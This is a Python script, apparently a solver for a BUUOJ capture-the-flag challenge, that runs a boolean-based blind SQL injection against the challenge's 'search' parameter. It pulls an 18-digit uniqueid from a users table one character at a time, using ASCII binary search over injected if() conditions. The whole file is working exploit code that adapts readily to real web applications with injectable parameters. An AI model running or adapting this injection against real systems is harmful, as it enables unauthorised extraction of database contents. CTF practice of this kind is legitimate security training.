#!/usr/bin/env python3
import requests

url = "http://b7a930e1-2905-4b23-a4e6-55294ddd82af.node5.buuoj.cn:81/index.php"

def check(condition):
    """盲注检测条件是否为真"""
    payload = f"1 and if({condition},1,0)"
    try:
        r = requests.get(url, params={"search": payload}, timeout=10)
        return "uniqueid=1 and if" in r.text
    except:
        return False

def binary_search_char(query, pos, charset="0123456789"):
    """二分查找字符 - 数字"""
    low, high = 0, len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        char_val = ord(charset[mid])
        condition = f"ascii(substr({query},{pos},1))>{char_val}"
        if check(condition):
            low = mid + 1
        else:
            condition_eq = f"ascii(substr({query},{pos},1))={char_val}"
            if check(condition_eq):
                return charset[mid]
            high = mid - 1
    return None

def extract_string(query, length):
    """提取字符串"""
    result = ""
    for i in range(1, length + 1):
        char = binary_search_char(query, i)
        if char:
            result += char
            print(f"[+] Position {i}: {char} -> {result}")
        else:
            break
    return result

# 提取 uniqueid - 18位数字
print("[*] Extracting uniqueid (18 digits)...")
uniqueid_query = "(select uniqueid from users limit 1)"
uniqueid = extract_string(uniqueid_query, 18)
print(f"[+] UniqueID: {uniqueid}")
